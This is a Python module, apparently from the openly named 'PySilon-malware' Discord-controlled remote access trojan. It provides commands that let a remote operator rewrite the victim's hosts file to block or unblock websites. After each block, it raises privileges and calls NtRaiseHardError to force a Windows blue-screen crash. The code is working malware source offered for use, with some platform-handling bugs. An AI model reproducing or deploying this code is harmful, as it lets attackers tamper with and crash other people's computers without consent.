import ctypes, platform
from urllib.parse import urlparse
# end of imports

# on message
def get_hosts_file_path():
    system = platform.system()
    if system == "Windows":
        hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'
    elif system == "Linux" or system == "Darwin":
        hosts_file_path = '/etc/hosts'
    else:
        return None

    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path) != -1:
        return hosts_file_path

    return None

if message.content.startswith('.block-website'):
    args = message.content.split()
    if len(args) < 2:
        await message.channel.send("Please enter at least one website to be blocked.")
        return

    websites = args[1].split(',')
    websites = [website.strip() for website in websites]

    for website in websites:
        if not website.startswith("http://") and not website.startswith("https://"):
            website = "https://" + website

        parsed_url = urlparse(website)
        host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
        hosts_file_path = get_hosts_file_path()

        if hosts_file_path:
            with open(hosts_file_path, 'a') as hosts_file:
                hosts_file.write(host_entry)
            embed = discord.Embed(title=f"🚫 Website Blocked", description=f'```Website {parsed_url.netloc} has been blocked. Unblock it by using .unblock-website [websitename]```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)

            nullptr = ctypes.POINTER(ctypes.c_int)()
            ctypes.windll.ntdll.RtlAdjustPrivilege(
                ctypes.c_uint(19), 
                ctypes.c_uint(1), 
                ctypes.c_uint(0), 
                ctypes.byref(ctypes.c_int())
            )
            ctypes.windll.ntdll.NtRaiseHardError(
                ctypes.c_ulong(0xC000007B), 
                ctypes.c_ulong(0), 
                nullptr, 
                nullptr, 
                ctypes.c_uint(6),
                ctypes.byref(ctypes.c_uint())
            )
        else:
            print("Hostfile not found or no permissions.")
            embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)

elif message.content.startswith('.unblock-website'):
    args = message.content.split()
    if len(args) < 2:
        await message.channel.send("Please enter at least one website to be unblocked.")
        return

    websites = args[1].split(',')
    websites = [website.strip() for website in websites]

    for website in websites:
        website = website.replace("https://", "")
        website = website.replace("http://", "")
    
        hosts_file_path = get_hosts_file_path()

        if hosts_file_path:
            with open(hosts_file_path, 'r') as hosts_file:
                lines = hosts_file.readlines()

            filtered_lines = [line for line in lines if website not in line]

            with open(hosts_file_path, 'w') as hosts_file:
                hosts_file.writelines(filtered_lines)

            embed = discord.Embed(title=f"✅ Website Unblocked", description=f'```Website {website} has been unblocked.```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)
        else:
            print("Hostfile not found or no permissions.")
            embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)
